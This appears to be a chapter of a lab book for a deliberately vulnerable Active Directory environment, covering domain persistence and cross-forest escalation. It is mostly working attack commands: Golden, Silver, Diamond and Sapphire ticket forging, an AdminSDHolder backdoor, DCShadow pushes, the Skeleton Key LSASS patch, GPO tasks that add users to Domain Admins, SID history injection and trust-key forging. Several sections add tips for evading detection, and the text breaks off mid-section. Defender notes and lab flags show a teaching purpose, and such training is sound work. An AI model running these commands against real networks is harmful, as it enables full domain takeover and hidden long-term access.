# 12 — Persistence and Forest Compromise

You have Domain Admin on `corp.local`. Now what?

1. **Persistence** — survive a password reset, a clean reinstall of one DC, a SOC sweep, krbtgt rotation, EDR rollout.
2. **Forest compromise** — escalate from a child domain to **Enterprise Admin** on the forest root (`root.corp`), and pivot into the **external forest** (`finance.local`) and the child domain (`eu.corp.local`).

This chapter covers **PER-001..037** and **DF-001..040** from `PLAN.md`. It is the longest chapter in the book because persistence + cross-forest is where the long game lives, and most defenders only think one layer deep.

A persistence engagement is fundamentally different from initial-access work. Initial access asks "can I get in?". Persistence asks "if the SOC notices, can I stay?". The answer depends not on which exploit you ran but on how many independently-rooted backdoors you planted, how diverse the credential material is, and how well the artefacts blend with normal admin activity.

---

## 12.0.1 (BloodHound) Domain Persistence Architecture

```mermaid
graph LR
    classDef user fill:#1d2b38,stroke:#00d2ff,stroke-width:2px,color:#fff;
    classDef group fill:#3a1d38,stroke:#ff00d2,stroke-width:2px,color:#fff;
    classDef object fill:#333333,stroke:#aaaaaa,stroke-width:2px,color:#fff;

    Steve[steve.rogers]:::user -->|GenericAll| AdminSD[AdminSDHolder]:::object
    AdminSD -.->|SDProp / FullControl| DA[Domain Admins]:::group
```

---

## 12.0 (Concept) Why this chapter is the longest

The previous chapters were about *executing* a chain. This chapter is about *not losing* the position you just earned. That requires:

- A model of what defenders will do (reset passwords, rotate krbtgt, wipe and rebuild DCs, sweep with EDR, audit ACLs).
- A model of what survives each of those actions.
- An understanding of the **forest trust graph** that DVAD ships — three forests with two trusts (one external, one forest-trust) plus one parent-child relationship.
- The exact tooling commands to plant each backdoor without leaving the obvious fingerprints.

The persistence-vs-defense calculus is asymmetric. The defender has to find every backdoor; the attacker only has to keep one alive. That's why operators stack 5–10 independent persistence mechanisms in any serious engagement.

---

## 12.1 (Concept) The persistence ladder

```
+--------------------------------------------------+
|  Forest-wide / cross-forest                     |   Trust-ticket forge, ESC8 to other forest CA,
|                                                  |   krbtgt of root, SID history into Enterprise Admins,
|                                                  |   schema modify
+--------------------------------------------------+
|  Domain-wide                                    |   krbtgt Golden Ticket, AdminSDHolder ACL implant,
|                                                  |   DCShadow attribute push, skeleton key,
|                                                  |   GPO logon-script implant, certificate persistence,
|                                                  |   shadow-cred on protected user
+--------------------------------------------------+
|  Object-scoped                                  |   Shadow credentials on DA, RBCD on DC,
|                                                  |   GenericAll on protected user, msDS-AllowedToActOn
+--------------------------------------------------+
|  Host-local                                     |   Service install, scheduled task, accessibility
|                                                  |   binaries, registry Run keys, WMI subscription,
|                                                  |   DLL hijack, COM hijack, DSRM logon
+--------------------------------------------------+
```

Higher rungs survive harder things; lower rungs are cheaper and quieter. Real operators stack them — *at minimum* one host-local, one object-scoped, and one domain-wide, in case any single rung is detected and burned.

### Cost-vs-survival matrix

| Rung | Cost to plant | Survives password reset | Survives krbtgt rotation | Survives DC rebuild | Survives EDR rollout |
|---|---|---|---|---|---|
| Service install | trivial | yes (different user context) | yes | no | sometimes |
| Scheduled task | trivial | yes | yes | no | sometimes |
| WMI subscription | low | yes | yes | no | often |
| Shadow cred on protected user | low | yes | yes | yes | yes |
| Certificate (1–2 yr) | low | yes | yes | yes | yes |
| Golden ticket (10y stamp) | low | n/a | no (after rotation) | yes | yes |
| Diamond/Sapphire ticket | medium | yes | no (after rotation) | yes | yes |
| AdminSDHolder ACL backdoor | low | yes (re-pwd after) | yes | no (replicates but rebuilt DC restores) | yes |
| DCShadow attribute push | medium | depends on attribute | yes | yes | mostly |
| Skeleton key | low | yes | yes | no (rebooted) | no (CG/PPL kills it) |
| GPO startup-script | medium | yes (re-applies) | yes | yes (GPO replicates) | likely caught |
| SID history injection | medium | yes | yes (until SID filter) | yes | yes |
| Trust key forge | medium | yes | yes for cross-realm | yes | yes |
| Schema backdoor | high | yes | yes | yes | yes (no rollback) |
| ESC8 to other forest | medium | yes | n/a | yes | yes |

The bottom rows are the keystones of a long-tenure engagement. The top rows are the day-one safety net.

---

## 12.2 Golden Ticket (PER-001)

### Mechanics

A Golden Ticket is a forged **TGT** for the `krbtgt` realm. Because the KDC signs TGTs with `krbtgt`'s key, and you stole `krbtgt`'s NT hash via DCSync, you can sign your own.

```
+------------------------------------------------------+
|  TGT (forged Golden)                                 |
|    cname:    Administrator                           |
|    crealm:   CORP.LOCAL                              |
|    sname:    krbtgt/CORP.LOCAL                       |
|    PAC.LOGON_INFO:                                   |
|      UserId:    500                                  |
|      GroupIds:  512 (DA), 513 (Users), 518 (Schema), |
|                 519 (EA), 520 (Group Policy Creator) |
|      ExtraSids: S-1-5-21-<rootSID>-519               |
|    Server sig:  HMAC(krbtgt_NT, ...)                 |
|    KDC sig:     HMAC(krbtgt_NT, ...)                 |
|    enc-part:    AES256(krbtgt_AES256, ...)           |
|    Lifetime:    up to 10 years (Mimikatz default)    |
+------------------------------------------------------+
```

Because the **server signature** and **KDC signature** in the PAC are both keyed off `krbtgt`, the DC accepts the ticket without checking whether the user actually exists, is enabled, or is a member of those groups. The TGT does not transit the wire as a packet — you load it into your client cache, and only the *TGS-REQ* that uses it is visible to a DC.

### Forge with impacket

```bash
# Step 1 — find the domain SID:
impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 0 | head
# look for "Domain SID: S-1-5-21-A-B-C"

# Step 2 — forge the TGT:
impacket-ticketer \
    -nthash <krbtgt_NT> \
    -domain-sid S-1-5-21-A-B-C \
    -domain corp.local \
    Administrator
# → writes Administrator.ccache

# Step 3 — use:
export KRB5CCNAME=$PWD/Administrator.ccache
klist  # should show the forged ticket
impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
```

You can pass `-aesKey <hex>` instead of `-nthash` for an AES-encrypted ticket, which avoids the RC4 wire signature (see §12.2.4 below).

### Forge with Rubeus (in-host)

```
.\Rubeus.exe golden /user:Administrator /domain:corp.local \
    /sid:S-1-5-21-A-B-C /rc4:<krbtgt_NT> /id:500 \
    /groups:500,512,513,518,519,520 /ldap /ptt
```

`/ldap` makes Rubeus query AD for the real timestamps and group list, producing a less anomalous PAC. `/ptt` injects into the current session.

### Forge with mimikatz (legacy reference)

```
mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
        /sid:S-1-5-21-A-B-C /krbtgt:<NT> /id:500 \
        /groups:500,501,512,513,518,519,520 /ptt
```

Mimikatz historically used a 10-year lifetime by default, which is itself a detection — modern operators trim with `/endin:600 /renewmax:10080` to match a default policy.

### Opsec knobs

| Knob | Why it matters | Recommended value |
|---|---|---|
| Encryption type | RC4 (etype 23) is flagged by every modern detection | AES256 (etype 18), pass `/aes256` or `-aesKey` |
| Lifetime | 10y is a Mimikatz fingerprint | match the domain policy (often 10h ticket / 7d renew) |
| `crealm` | mismatch from any field is suspicious | match the actual domain |
| Logon ID (PAC) | unique per logon, defenders compare across events | leave realistic |
| Groups | include the *real* groups for that user — defenders compare PAC to LDAP | use `/ldap` |

### Survival

Resetting `krbtgt` invalidates the ticket. AD keeps `key(n)` and `key(n-1)`, so one reset still accepts the old key for a while; defenders must reset **twice**, with the resets ≥ 10 hours apart, for the old hash to be fully retired. Until then, Goldens minted with the leaked hash still work.

The "double-tap" is one of the most-asked defender questions because doing it wrong actively prolongs your access — if a defender resets only once, you simply forge fresh tickets using the same hash for another 10 hours.

### Defender's view

```
Event 4768 → no record (TGT was never issued)
Event 4769 → record EXISTS for service requests, but no preceding 4768
TicketEncryptionType: 0x17 (RC4) is the smoking gun on default Mimikatz tickets
Lifetime: 10 years (= 315360000 sec) is pathological
ClientName: an account that doesn't exist in AD, or is disabled
```

Defender for Identity detects this natively as "Suspected Golden Ticket usage."

[Flag: PER-001]

---

## 12.3 Silver Ticket (PER-002)

A Silver Ticket is a forged **TGS** for a single service. The TGS is signed with the *service account's* key, not krbtgt — so if you have the service account NT hash (Kerberoasted, dumped from LSASS, or extracted from a host's machine account), you can forge service tickets directly without ever talking to the KDC.

### Why this is valuable

- **No wire trace to the DC.** The attacker forges the TGS locally; only the AP-REQ to the target service is visible, and that auth looks like any normal Kerberos auth from the target's view.
- **Doesn't depend on krbtgt.** Works after a krbtgt reset.
- **Scope is one service.** By design, can only access the one target SPN. That's a constraint *and* a stealth feature.

### Forge

```bash
# For MSSQL on sql01:
impacket-ticketer \
    -nthash <sql01$_NT> \
    -domain-sid S-1-5-21-A-B-C \
    -domain corp.local \
    -spn 'MSSQLSvc/sql01.corp.local:1433' \
    Administrator

export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k corp.local/Administrator@sql01.corp.local
```

For CIFS on a file server you supply `-spn 'cifs/file01.corp.local'`. For HTTP (WinRM/IIS) you supply `-spn 'http/file01.corp.local'`. The hash must be the account that owns the SPN — for `cifs/<host>` that's the computer account; for `MSSQLSvc/...` it could be either the computer account or a dedicated service user.

### Limitations

- Silver tickets don't get a fresh PAC validation against the DC by default, but Server 2022 + KB5020805 (PAC validation hardening) re-checks more aggressively. Forge against current Microsoft-patched DCs may be detected.
- If the target service requires PAC validation (`ValidateKdcPacSignature=1` plus newer hardening), the forged ticket fails because the KDC signature was never verified.

### Detection (defender's view)

Silver leaves *less* trace than Golden because the AS-REQ/TGS-REQ never happen. The signal is:

- A successful 4624 (network logon) for the targeted service with a Kerberos auth package.
- **No** preceding 4769 on the DC for that user-SPN pair.

That negative-evidence detection is hard to engineer in practice — defenders usually correlate via SIEM by time-window joining.

[Flag: PER-002]

---

## 12.4 Diamond Ticket (PER-003)

Hybrid Golden/legitimate. Request a *real* TGT via AS-REQ, then **decrypt** the encrypted-part of the TGT (you have the krbtgt key), **modify** the PAC (swap user, add groups, add SID history), then **re-encrypt** with the same key. The TGT is now indistinguishable from a real one because the AS-REQ actually happened — there's a 4768 on the DC for the real user with normal pre-auth.

```bash
# Rubeus diamond uses AES256 + decrypt-modify-reencrypt flow
.\Rubeus.exe diamond \
    /user:peter.parker /password:'DVADlab2024!' /enctype:aes256 \
    /krbkey:<krbtgt_AES256> \
    /ticketuser:Administrator /ticketuserid:500 \
    /groups:512,513,518,519,520 \
    /ptt
```

### Detection-evasion vs Golden

- **Golden:** no AS-REQ. Defender's flagship signal.
- **Diamond:** real AS-REQ exists. Defenders can't rely on "TGS without preceding TGT" anymore.

What still gives Diamond away:
- The decrypted PAC may have inconsistent timestamps (real LogonTime vs forged values).
- AES is mandatory; if you forge an RC4 Diamond, the etype downgrade is itself anomalous.
- The user named in the PAC vs the user in the AS-REQ differ — sophisticated DfI rules cross-check.

### Tooling alternatives

- **Rubeus diamond** — Windows in-host.
- **kekeo** — older but supports the technique.
- **impacket-ticketer** — does not support Diamond directly; you'd manually decrypt/encrypt using krb5 tools, then re-pack.

[Flag: PER-003]

---

## 12.5 Sapphire Ticket (PER-004)

Variant of Diamond that uses **S4U2Self + U2U** to build a PAC for an arbitrary user, then strips and resigns. Produces the highest-fidelity PAC available without insider help: real Last-Logon timestamps, real LogonScript, real SID history, real PrimaryGroupId.

```
+----------------------------------------------+
|  Workflow                                    |
|  1. Request TGT for peter.parker (real AS-REQ).     |
|  2. S4U2Self for Administrator → gets a TGS  |
|     containing the real PAC for Admin.       |
|  3. U2U flag asks DC to encrypt with         |
|     session key of TGT, not service key —    |
|     so attacker can decrypt.                 |
|  4. Decrypt, extract PAC, re-sign with       |
|     stolen krbtgt key into a new TGT.        |
|  5. Inject and use.                          |
+----------------------------------------------+
```

```bash
# Rubeus s4u with U2U:
.\Rubeus.exe asktgt /user:peter.parker /password:'DVADlab2024!' /enctype:aes256 /nowrap
.\Rubeus.exe s4u /self /impersonateuser:Administrator /nowrap \
    /altservice:krbtgt /ticket:<base64_TGT> /opsec
```

### Why this matters

- The PAC contains values the attacker could not have *guessed* — the DC filled them in.
- Indistinguishable from a real TGT to most modern detections.
- Still requires `krbtgt` key to re-sign.

### Detection

DfI catches this only when:
- The S4U2Self exchange originates from a non-DC,
- And the resulting ticket is then used from a different host than the originator.

Catch rate today is poor unless the org has full ETW + correlation in place.

[Flag: PER-004]

---

## 12.6 (Concept) Why krbtgt is the keys to the kingdom

`krbtgt` is the only account whose hash signs TGTs. Whoever has its hash can:

- Forge any user → group membership combo (Golden, Diamond, Sapphire).
- Forge for any user that ever existed *or never existed* in the domain.
- Bypass account disables, password resets, MFA, conditional access — Kerberos as a protocol has no concept of MFA. (Conditional access enforcement happens at the resource, not at the TGT.)

It's not just "an admin account." It is the **trust anchor of every Kerberos ticket in the domain.**

### Why rotation is painful

Rotating krbtgt is destructive — every outstanding TGT becomes invalid; users see Kerberos errors until their next AS-REQ. Two resets are required because AD keeps `key(n)` and `key(n-1)`, so one rotation still accepts the old key. The official Microsoft script (`New-KrbtgtKeys.ps1`) implements the double rotation with a built-in 10-hour wait between resets to allow ticket lifetimes to expire.

Many orgs never rotate krbtgt at all — the operational pain is real, and "it'll be fine" is the default position until an incident forces the question.

### Per-forest separation

Each domain has its own `krbtgt`. Compromising `krbtgt@corp.local` does NOT compromise `krbtgt@root.corp` or `krbtgt@finance.local` — but if you have DA on corp.local you can DCSync each `krbtgt` separately if you have replication rights, which you usually do not across forest boundaries.

The cross-forest forge (DF-005) uses the **trust account** key, not krbtgt — see §12.14.

---

## 12.7 AdminSDHolder backdoor (PER-014)

### Mechanics

`AdminSDHolder` is a container in `CN=System,DC=corp,DC=local`. Every ~60 minutes, the **SDProp** task on the DC holding the PDC Emulator FSMO role copies its `nTSecurityDescriptor` onto every member of every "protected" group (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Server Operators, Backup Operators, Print Operators, Replicator, krbtgt). The copy **overwrites** the existing DACL on those user objects — that's the entire point of SDProp: keep privileged users from having ACLs delegated away.

If you can write the DACL on AdminSDHolder, you implant an ACE that says "steve.rogers has GenericAll on this object." Within 60 minutes (or immediately if you force SDProp), every protected user has steve.rogers as GenericAll. Reset their passwords, set shadow creds, anything you want.

### Exploit

```bash
# Add a GenericAll ACE for steve.rogers on AdminSDHolder:
impacket-dacledit -action 'write' -rights 'FullControl' \
    -principal 'steve.rogers' \
    -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
    'corp.local/Administrator@10.10.0.10' -hashes :<NT>
```

Or with bloodyAD:

```bash
bloodyAD --host 10.10.0.10 -d corp.local -u Administrator -p '...' \
    add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' steve.rogers
```

Or with PowerView (on-host):

```
PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
        -PrincipalIdentity steve.rogers -Rights All
```

### Force SDProp

Don't wait an hour — kick it manually. The rootDSE operational attribute `RunProtectAdminGroupsTask=1` triggers SDProp immediately:

```powershell
PS> Set-ADObject -Identity 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local' \
        -Replace @{RunProtectAdminGroupsTask=1}
```

Or via ldapmodify:

```
dn:
changetype: modify
add: RunProtectAdminGroupsTask
RunProtectAdminGroupsTask: 1
```

After SDProp runs, every protected user has peter.parker's ACE. Confirm with:

```bash
impacket-dacledit -action 'read' \
    -target-dn 'CN=Administrator,CN=Users,DC=corp,DC=local' \
    'corp.local/peter.parker@10.10.0.10' -hashes :<alice_NT>
```

You should see your ACE near the bottom. Then:

```bash
# Reset Administrator's password — you have FullControl on the user object:
net rpc password 'Administrator' 'NewPass1!' -U corp.local/peter.parker%'<alice_pw>' -S 10.10.0.10
```

### Reverse-style: AdminSDHolder ACL replicates

The implant lives on AdminSDHolder itself and replicates to all DCs in the domain. Rebuilding one DC doesn't help; the implant comes back via replication. To remove, audit AdminSDHolder ACEs against baseline and revert.

### Variants

- Add ACE for `Everyone` or `Authenticated Users` — broadest impact but loud.
- Add **ExtendedRights: DS-Replication-Get-Changes / -All** — gives peter.parker DCSync via SDProp propagation.
- Add **ExtendedRights: User-Force-Change-Password** — lets peter.parker reset DA password without GenericAll.

### Defense

- Monitor changes to AdminSDHolder's DACL (event 5136 with that DN — high-fidelity).
- Periodically audit AdminSDHolder ACEs against a known baseline (PowerShell `Get-Acl ad:...`).
- Alert on event 4780 (SDProp DACL reset).

[Flag: PER-014]

---

## 12.8 DCShadow (PER-006)

### Mechanics

Mimikatz fakes itself as a DC: it registers the SPNs `GC/<dn>` and `E3514235-4B06-11D1-AB04-00C04FC2DCD2/<dn>` on a computer account, briefly creates an `nTDSDSA` object under `CN=Servers,CN=Sites,...`, then uses MS-DRSR `DrsReplicaAdd` to **push** arbitrary attribute changes into AD replication.

Because the changes come through the replication path (DRS_REPLICA_SYNC + IDL_DRSReplicaAdd), they bypass most ACL checks and many audit policies — the 4662 audit fires on the *original* object modify, but DRSR push doesn't trigger that. The DC receiving the push trusts it because the source appears (briefly) as a DC.

### Walkthrough

```
mimikatz # !+                  # load mimidrv.sys (kernel driver)
mimikatz # !processtoken       # elevate to SYSTEM
mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
                              /attribute:primaryGroupID /value:519
# (mimikatz prints "** Server: <fake DC> registered" and listens)

# In a second mimikatz session (also SYSTEM):
mimikatz # lsadump::dcshadow /push
```

Now peter.parker's primary group is Enterprise Admins (RID 519). Logs in corp's normal audit channel look like routine replication.

### Multi-attribute push

You can chain attributes:

```
mimikatz # lsadump::dcshadow /object:CN=peter.parker,... /attribute:sidHistory /value:S-1-5-21-<root>-519
mimikatz # lsadump::dcshadow /object:CN=peter.parker,... /attribute:userAccountControl /value:66048
mimikatz # lsadump::dcshadow /object:CN=peter.parker,... /attribute:msDS-KeyCredentialLink /value:<keycred>
mimikatz # lsadump::dcshadow /push
```

The `/push` flushes everything.

### Preconditions

- Local admin on a host (to load `mimidrv.sys`).
- A computer account in the domain (for the fake-DC SPN registrations) — you need `Validated-SPN` on it, which the computer account owner has implicitly.
- Network reach to a real DC over DRSR RPC (TCP 135 + dynamic).
- The original mimikatz uses a kernel driver. The python `dcshadow` implementations (impacket scripts in some forks) bypass that, but most production EDR catches them.

### Defense

- Audit DC registrations: any new `nTDSDSA` object should fire an alert. Defender for Identity does this natively as "Suspected DCShadow."
- Monitor 4742 (Computer Account Changed) for unexpected SPN additions matching `GC/` or `E3514235-4B06-11D1-AB04-00C04FC2DCD2/`.
- DfI also flags the DRSR-from-non-DC pattern.

### Why DCShadow is the *most* important defender story

A defender who only watches LDAP modifications will see *nothing* for an attribute change pushed via DCShadow. To catch it, the defender needs DC-to-DC RPC traffic instrumented (Defender for Identity NPCAP-style sensor on every DC) — which most orgs don't have.

[Flag: PER-006]

---

## 12.9 Skeleton Key (PER-007)

`mimikatz # misc::skeleton` patches LSASS on the DC in memory. After this, **every account** in the domain accepts a **second** password — `mimikatz` by default — alongside its real one. The patch hooks the function that compares the supplied password to the stored hash, adding an early-return for the magic value.

```
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

Then anywhere in the domain:

```bash
impacket-psexec corp.local/Administrator:mimikatz@dc01.corp.local   # works (skeleton)
impacket-psexec corp.local/Administrator:'<real_pw>'@dc01.corp.local # still works (real pw)
impacket-psexec corp.local/peter.parker:mimikatz@dc01.corp.local            # works for ANY user
```

### Scope

- Survives until the DC reboots (no on-disk modification, no event log entry for the patch).
- **Single-DC visibility** — replication doesn't carry the patch. If the user authenticates against a different DC, only the real password works. Skeleton-keyed DCs are the *only* DCs that accept the magic value.
- Doesn't help against PKINIT (Kerberos cert auth) or smart-card.

### Operational note

Many ops install skeleton on every DC for full coverage. That requires DA on each, but you usually have that already.

### Defense

- **LSA Protection (`RunAsPPL=1`)** prevents the patch — mimikatz can't open lsass for write.
- **Credential Guard** isolates the secrets, but the *hook point* is in non-CG LSASS — testing required to confirm CG breaks skeleton on a given OS build.
- Reboot DCs on schedule. Anything skeleton-implanted vanishes.

[Flag: PER-007]

---

## 12.10 Persistence via certificates (PER-013)

If you got an `Administrator` certificate via ESC1/ESC8/Shadow Cred, **save it**. Even after passwords reset, you can re-authenticate with PKINIT and pull a new TGT — until either:
- The cert expires (often 1–2 years on default templates).
- The cert is revoked AND the CRL is published AND clients check it.
- `NTAuthCertificates` is rotated (rare — breaks every cert in the forest).

```bash
# Re-authenticate with the stashed PFX months later:
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
# → fresh NT hash and TGT
```

### Why this is the strongest non-Golden persistence

- Survives `krbtgt` rotation (PKINIT doesn't depend on krbtgt for the AS-REP encryption part you control).
- Survives password rotation (cert binding is by UPN, not password).
- Survives any single-account compromise discovery (the cert is on disk, not in AD).
- Easy to stash off-host.

### Variants

- **PER-013 (cert for current user):** save the Administrator PFX.
- **PER-016 (cert for many users):** during ESC1/ESC8 abuse, batch-request certs for every Tier-0 user. One survives.
- **PER-018 (cert with weird template):** request a cert from a template that's *seldom audited*, like one used for legacy 802.1x.

### Defense

- Short cert lifetimes (90 days) for high-priv users.
- Manager approval requirement on templates that admins use (ESC1's fix).
- Strong cert binding (`StrongCertificateBindingEnforcement=2`) — limits ESC9/10 abuse.
- CRL must publish quickly + clients must check it. (Most lazy CAs publish weekly.)
- Audit issued certs (event 4887) — look for certs with SAN ≠ requester.

[Flag: PER-013]

---

## 12.11 Shadow Credentials persistence (PER-017)

Plant a `msDS-KeyCredentialLink` on a protected user. Even after AdminSDHolder restores the DACL, the key cred remains (it's an attribute, not an ACE), and you can PKINIT-as-them whenever.

```bash
# Plant:
certipy shadow auto -u peter.parker@corp.local -p '...' -account 'Administrator' -dc-ip 10.10.0.10

# Or manually with explicit add + save device key:
certipy shadow add -u peter.parker@corp.local -p '...' -account 'Administrator' \
    -dc-ip 10.10.0.10 -out admin-keycred
# Save admin-keycred.pem and admin-keycred.cer

# Months later, re-auth:
certipy auth -pfx admin-keycred.pfx -dc-ip 10.10.0.10
```

### Why this survives

- The `msDS-KeyCredentialLink` attribute is on the user object, not on AdminSDHolder.
- SDProp resets the *DACL*, not arbitrary attributes.
- Even after a password reset, the attached key still issues NT-Auth certs via PKINIT.

### Detection

- Defenders need to enumerate `msDS-KeyCredentialLink` on every privileged user and recognise unauthorised entries.
- Microsoft's `Get-ADUser -Properties msDS-KeyCredentialLink | ?{$_.msDS-KeyCredentialLink}` finds any user with one.
- Defender for Identity has a "Shadow Credentials" detection that fires on the PKINIT auth that uses the planted key.

[Flag: PER-017]

---

## 12.12 GPO-based persistence (PER-021)

Edit a GPO that targets DCs (e.g., **Default Domain Controllers Policy**) or a high-priv container. Add a scheduled task or startup script that adds your user to Domain Admins on boot. Even a DA password reset doesn't help defender; on the next gpupdate cycle the user is back in.

```bash
# SharpGPOAbuse (Windows in-host):
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" \
    --Author "NT AUTHORITY\SYSTEM" \
    --Command "cmd.exe" --Arguments "/c net group 'Domain Admins' peter.parker /add /domain" \
    --GPOName "Default Domain Controllers Policy"
```

Wait for next gpupdate (~90 min default + 0-30min random offset) or force on a victim with `gpupdate /force`.

### Linux-side: pyGPOAbuse

```bash
pygpoabuse.py corp.local/Administrator:'...'@10.10.0.10 \
    --gpo-id '{31B2F340-016D-11D2-945F-00C04FB984F9}' \
    --command 'net group "Domain Admins" peter.parker /add /domain'
```

The GUID is the GPO ID from `gpme.msc` or `Get-GPO -All | select DisplayName,Id`.

### What gets persisted where

A GPO is a folder under `\\corp.local\SYSVOL\corp.local\Policies\{GUID}\`:
```
{GUID}\
  GPT.INI                       # version metadata
  Machine\
    Preferences\
      ScheduledTasks\
        ScheduledTasks.xml      # your task lives here
    Scripts\
      Startup\
        scripts.ini             # script registrations
        evil.bat                # the script itself
```

You can edit these files directly from any client with write access (which DA has). SharpGPOAbuse/pyGPOAbuse do exactly this — modify `ScheduledTasks.xml` and bump GPT.INI's version.

### Variants

| Variant | What it does | Detection |
|---|---|---|
| AddComputerTask | Schedule task targeting computers | 4698 |
| AddUserTask | Schedule task targeting users | 4698 user-side |
| AddComputerScript | Startup script targeting computers | 4663 on script file write |
| AddUserStartupScript | Logon script for users | 4663 |
| AddLocalAdmin | Add user to local Administrators via Restricted Groups | 5136 on GPO |

### Defense

- Audit 5136 on `gPCFileSysPath` attribute changes — that's when a GPO's version bumps.
- Audit SYSVOL writes — every GPO edit writes there.
- Keep an inventory of every scheduled task / startup script in every GPO and diff against it.

[Flag: PER-021]

---

## 12.13 SID History injection (PER-026 / DF-021)

`sIDHistory` is an attribute on user/group objects, designed for migration: when you move a user from `OLD\jdoe` to `NEW\jdoe`, you add `OLD-domain-SID-...-1105` to `sIDHistory` so ACLs that named the old SID still match. The DC then includes both SIDs in the user's PAC, so they appear to be the new *and* the old principal simultaneously.

If you can write `sIDHistory` directly (via DCShadow, or because you're DA in a domain with a trust to the target), you can inject an arbitrary SID, including **Enterprise Admins (S-1-5-21-rootSID-519)**, **Schema Admins (518)**, or any high-priv SID in any trusted domain.

### Inject via DCShadow

```
mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
    /attribute:sIDHistory /value:S-1-5-21-<rootSID>-519
mimikatz # lsadump::dcshadow /push
```

### Inject via ticket forge

You don't even need to write to AD — forge a Golden with `ExtraSids` in the PAC:

```bash
impacket-ticketer \
    -nthash <krbtgt_NT> \
    -domain-sid S-1-5-21-CORP \
    -domain corp.local \
    -extra-sid S-1-5-21-<rootSID>-519 \
    Administrator
```

Now peter.parker's PAC carries Enterprise Admins anywhere in the forest — until SID filtering kicks in.

### SID filtering matrix

| Trust type | Default SID filter | Bypassable? |
|---|---|---|
| Intra-forest (parent–child, tree–root) | **NO** (forest is one security boundary by design) | n/a |
| Forest trust (separate forests, transitive) | **YES** (`QUARANTINED_DOMAIN` bit) | Yes if admin sets `netdom trust /enablesidhistory:Yes` (DVAD does this for `finance.local`) |
| External trust (non-transitive, one or two-way) | **YES** | Same flag |
| Realm trust (to non-AD Kerberos realm) | YES | configurable |
| Shortcut trust | inherits forest behavior | n/a |

In the DVAD lab:
- `corp.local` ↔ `root.corp` is an **intra-forest** parent–child → SID filter OFF by design → SID history injection works.
- `corp.local` ↔ `finance.local` is a **forest trust** with SID filtering deliberately weakened → works.
- `corp.local` ↔ `eu.corp.local` is an **intra-forest** child → SID filter OFF.

[Flag: PER-026 / DF-021]

---

## 12.14 Inter-forest persistence: Trust ticket forge (DF-005)

### Mechanics

A forest trust has a **trust key**: the password of the trust account (a hidden user named `<TRUSTED_DOMAIN>$` or `TDO$`). Both forests know it. With that key, you can forge an **inter-realm TGT** — a TGT for the trusting realm signed with the trust key. Hand it to the trusting realm's KDC and it issues you a TGS for anything in that realm.

```
+---------------------------------------------------------+
|  Inter-realm TGT (forged)                               |
|    crealm:   CORP.LOCAL                                 |
|    cname:    peter.parker                                      |
|    sname:    krbtgt/FINANCE.LOCAL                       |
|    PAC.LOGON_INFO.UserId:    peter.parker's RID                |
|    PAC.LOGON_INFO.ExtraSids: S-1-5-21-FINANCE-519       |
|    Server sig:               HMAC(trust_key, ...)       |
|    KDC sig:                  HMAC(trust_key, ...)       |
|    enc-part:                 AES256(trust_key, ...)     |
+---------------------------------------------------------+
```

### Get the trust key

DCSync the trust object — its key is stored under the trust object in AD. The simplest path is `impacket-secretsdump -just-dc` which dumps all secrets including trust accounts:

```bash
impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc \
    | grep -iE 'finance|FINANCE|TDO|TRUST'
```

You'll see lines like:

```
CORP.LOCAL\FINANCE$:aes256-cts-hmac-sha1-96:<key>
CORP.LOCAL\FINANCE$:aes128-cts-hmac-sha1-96:<key>
CORP.LOCAL\FINANCE$:des-cbc-md5:<key>
```

`FINANCE$` is the trust account on the corp side that represents the *outbound* trust to finance.

### Forge and use

```bash
impacket-ticketer \
    -nthash <trust_NT> \
    -domain-sid S-1-5-21-CORP \
    -domain corp.local \
    -extra-sid S-1-5-21-FINANCE-519 \
    -spn 'krbtgt/FINANCE.LOCAL' \
    Administrator

export KRB5CCNAME=Administrator.ccache

# Use the inter-realm TGT to request a TGS for a service in finance:
impacket-getST -k -no-pass \
    -spn 'cifs/dc01.finance.local' \
    -dc-ip 10.20.0.10 \
    corp.local/Administrator

impacket-psexec -k -no-pass dc01.finance.local
```

If SID filtering is enforced on the forest trust, the `ExtraSids` for Enterprise Admins of finance gets stripped — the auth still succeeds but you're just `Administrator@corp` in finance, which isn't admin there. DVAD removes the filter for educational purposes.

### Variants

- Use `aesKey` instead of `nthash` — quieter encryption type.
- Forge with `crealm` = root.corp to pivot child→root (DF-001).
- Forge for the *non-default* trust direction — the trust key works in both directions.

[Flag: DF-005]

---

## 12.15 Child → Root domain (DF-001)

`corp.local` is a child of `root.corp`. Parent–child is **within the forest**, so SID filtering does NOT apply to SID history — that's the design. The forest is the security boundary, not the domain.

Two paths from child DA → forest root EA:

### A. krbtgt of child + SID history injection

```bash
# You have krbtgt of corp.local (DCSync from DA).
# Forge a Golden TGT for peter.parker@corp.local with extra-sid = root Enterprise Admins:
impacket-ticketer \
    -nthash <corp_krbtgt_NT> \
    -domain-sid S-1-5-21-CORP \
    -domain corp.local \
    -extra-sid S-1-5-21-ROOT-519 \
    Administrator

export KRB5CCNAME=Administrator.ccache

# Request a TGS for a service on the root DC. The PAC carries the EA SID:
impacket-getST -k -no-pass \
    -spn 'cifs/dc01.root.corp' \
    -dc-ip 10.30.0.10 \
    'corp.local/Administrator'

impacket-psexec -k -no-pass dc01.root.corp
```

DC of `root.corp` sees peter.parker with EA in PAC → grants admin access.

### B. Inter-realm TGT forge

If you have the parent–child trust key (DCSync `trustAuthOutgoing` between corp and root.corp):

```bash
impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc | grep -i 'root\.corp\|ROOT'
# Then ticketer with extra-sid as in DF-005.
```

### C. Child DA → Domain Admins of root via DCSync

